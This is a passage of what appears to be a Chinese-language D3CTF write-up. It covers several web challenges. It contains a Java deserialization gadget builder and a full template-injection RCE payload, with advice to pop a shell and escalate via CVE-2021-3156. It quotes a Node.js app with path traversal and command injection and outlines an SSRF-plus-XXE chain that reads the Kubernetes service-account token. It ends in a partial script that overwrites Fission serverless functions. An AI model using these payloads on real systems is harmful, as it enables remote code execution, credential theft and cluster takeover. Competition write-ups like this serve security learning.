        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);
        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = 
Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
改⼀下fnmd师傅的Mysql Fake Server代码，返回⾃定义序列化数据即可。
https://github.com/fnmsd/MySQL_Fake_Server
        keyField.setAccessible(true);
        keyField.set(node, entry);
        ObjectOutputStream o = new ObjectOutputStream(new 
FileOutputStream("/Users/smi1e/MySQL_Fake_Server/Object.obj"));
        o.writeObject(map);
        o.flush();
        o.close();
        Exp exp = new Exp();
        ObjectOutputStream ox = new ObjectOutputStream(new 
FileOutputStream("/Users/smi1e/MySQL_Fake_Server/Exp.obj"));
        ox.writeObject(exp);
//
//        ObjectInputStream xx = new ObjectInputStream(new 
FileInputStream("/Users/smi1e/Desktop/Tools/Exp/Rogue-MySql-
Server/MySQL_Fake_Server/Exp.obj"));
//        xx.readObject();
//        xx.close();
        return map;
    }
    public static void main(String[] args) throws Exception{
        getGadget();
    }
}
Happy_Valentine's_Day
模板注⼊
name=
[[${#this.getClass().getClassLoader().loadClass(#request.getHeader(111)).getDeclaredMethod(#req
uest.getHeader(222),#this.getClass().getClassLoader().loadClass(#request.getHeader(333))).invoke(
#this.getClass().getClassLoader().loadClass(#request.getHeader(111)).getDeclaredMethod(#reques
t.getHeader(444)).invoke(null),#request.getParameter(1))}]]&password=123
弹个shell回来然后CVE-2021-3156提权即可
Pool Calc
http://f899139df5.pool_calc.d3ctf.io/redirect?filename=app.js
const fs = require('fs')
const express = require('express')
const {exec} = require('child_process')
const format = require("string-format")
const dotenv = require("dotenv");
dotenv.config()
const app = express()
app.use(express.static('public'));
app.get("/", (req, res) => {
    return res.redirect("/redirect?filename=index.html")
})
app.get("/redirect", (req, res) => {
    let filename = req.query.filename
    res.sendFile(`${__dirname}/` + filename)
})
app.get('/calc', (req, res) => {
    let params = req.query
    var lang = params.language !== undefined ? params.language : "python"
    let calc_client_path = {
        "python": process.env.py_calc_tool_path,
        "php": process.env.php_calc_tool_path,
        "java": process.env.java_calc_tool_path
    }
    if (lang === 'python') {
        let data = {
            "action": params.action,
            "a": params.a,
            "b": params.b,
            "ip": process.env.py_calc_address,
            "port": process.env.py_calc_port
        }
        var cmd = format(calc_client_path.python + " " + '-action {action} -a 
{a} -b {b} -ip {ip} -p {port}', data)
    } else if (lang === 'php') {
        let data = {
            "action": params.action,
            "a": params.a,
            "b": params.b,
            "ip": process.env.php_calc_address,
            "port": process.env.php_calc_port
        }
        var cmd = format(calc_client_path.php + " " + '-action {action} -a {a} 
-b {b} -ip {ip} -p {port}', data)
    } else if (lang === 'java') {
        let data = {
        "action": params.action,
        "a": params.a,
        "b": params.b,
        "ip": process.env.java_calc_address,
        "port": process.env.java_calc_port
    }
        var cmd = format("java -jar" + " " + calc_client_path.java + " " + '-
action {action} -a {a} -b {b} -ip {ip} -p {port}', data)
    }
    try {
        exec(cmd, ((error, stdout, stderr) => {
            res.send(stdout)
        }))
    } catch (e) {
        res.send("Something Error")
    }
})
const port = process.env.web_app_port
app.listen(port, () => {
Part1：
命令注⼊，弹个shell回来得到第⼀个flag
Part2：
php swoole反序列化链
Part3：
python pickle反序列化
Part4：
jdk版本为8u221，⽤UnicastRef绕过JEP290限制，然后JRMP反序列化CC5攻击注册中⼼即可
real_cloud_storage
SSRF
服务器上传的时候⽤的S3的PutObject的那个协议，上传的时候是往
http://
{endpoint}/${key}这个路径发put包，然后服务器去处理
在出错的时候会返回⼀个XML包，⼤部分客户端都没对返回数据的xxe进⾏防护
这个题解法就是ssrf+xxe
SSRF + XXE
XXE读⽂件的payload太多了，这⾥就不写了，反正就是两个要点，服务器返回⼀个错误码，然后去上对
象存储那边看⼀下XML的定义，搞⼀个能读⽂件的xxe就好了
    console.log(`App listening at :${port}`)
})
POST /upload HTTP/1.1
Host: fn10031884.serverless.cloud.d3ctf.io
Content-Length: 109
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 
(KHTML, like Gecko) Chrome/91.0.4437.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: 
Referer: 
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
{"endpoint":"censored.com","key":"key","bucket":"censored","file":"MTIzNA=="}
real_cloud_serverless
读⽂件的时候，上⼀题的flag说要成为cluster admin，所以就想到了可能是kubernetes集群
集群⾥⾯有个两个关键⽂件
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/namespace
通过namespace发现是fission-function
结合题⽬名serverless，预测是fission 函数计算的框架，根据官⽹的部署脚本，推测出fission
controller这个service的域名是controller.fission
然后结合xxe，去读函数定义、httptrigger定义、数据包定义。
因为服务器是⽤put⽅式向后端发数据，所以我们去找fission⾥⾯的put的相关接⼝，发现可以对函数、
函数实现、httptrigger进⾏更新，那么就构造对应的包更新就好了
payload 简单写了个
import base64
import json
import requests
import time
package_data = """
{
    "metadata": {
        "name": "options-trigger-80f00d41-6f9c-48a4-9bae-e86939868571",
        "namespace": "default",
        "selfLink": "/apis/fission.io/v1/namespaces/default/packages/options-
trigger-80f00d41-6f9c-48a4-9bae-e86939868571",
        "uid": "822a0847-3d39-44ba-aefb-35c7687ecb3b",
        "resourceVersion": "74534",
        "generation": 1,
        "creationTimestamp": "2021-03-04T05:08:14Z",
        "managedFields": [
            {
                "manager": "fission-bundle",
                "operation": "Update",
                "apiVersion": "fission.io/v1",
                "time": "2021-03-04T05:08:14Z"
            }
        ]
    },
    "spec": {
        "environment": {
            "namespace": "default",
            "name": "python-env"
        },
        "source": {
            "checksum": {}
        },
        "deployment": {
            "type": "literal",
            "literal": "",
            "checksum": {}
        }
    },
    "status": {
        "buildstatus": "succeeded",
        "lastUpdateTimestamp": "2021-03-04T05:08:14Z"
    }
}
"""
function_data = """
{
    "metadata": {
        "name": "options-trigger",
        "namespace": "default",
        "selfLink": "/apis/fission.io/v1/namespaces/default/functions/options-
trigger",
        "uid": "047a33a8-6fb7-4f68-a9de-7027e793c849",
        "resourceVersion": "74535",
        "generation": 1,
        "creationTimestamp": "2021-03-04T05:08:14Z",
        "managedFields": [
            {
                "manager": "fission-bundle",
                "operation": "Update",
                "apiVersion": "fission.io/v1",
                "time": "2021-03-04T05:08:14Z"
            }
        ]
    },
    "spec": {
        "environment": {
            "namespace": "default",
            "name": "python-env"
        },
        "package": {
            "packageref": {
                "namespace": "default",
                "name": "options-trigger-80f00d41-6f9c-48a4-9bae-e86939868571",
                "resourceversion": "74534"
            },
            "functionName": "hello.main"
        },
        "secrets": null,
        "configmaps": null,
        "resources": {},
        "InvokeStrategy": {